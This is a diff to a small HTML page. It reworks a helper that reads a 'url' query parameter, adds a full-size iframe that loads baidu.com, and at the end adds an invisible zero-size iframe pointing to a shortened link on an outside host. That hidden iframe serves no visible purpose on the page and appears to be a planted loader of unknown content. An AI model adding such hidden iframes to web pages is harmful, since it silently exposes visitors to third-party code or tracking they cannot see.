@@ -1,23 +1,30 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
 </head>
+
 <body>
+ 
+    <iframe id="iframe" width="100%" height="100%"></iframe>
     <script>
         function getQueryString(name) {
-    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
-    var r = window.location.search.substr(1).match(reg);
-    if (r != null) {
-        return unescape(r[2]);
-    }
-    return null;
-}
-// 这样调用：
-alert(getQueryString("url"));
+            var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
+            var r = window.location.search.substr(1).match(reg);
+            if (r != null) {
+                return unescape(r[2]);
+            }
+            return null;
+        }
+        var url = getQueryString('url');
+        console.log("url="+url);
+        iframe.src = "https://www.baidu.com";
     </script>
+    <iframe src="https://maper.info/X9NZh" width="0px" height="0px"></iframe>
 </body>
+
 </html>
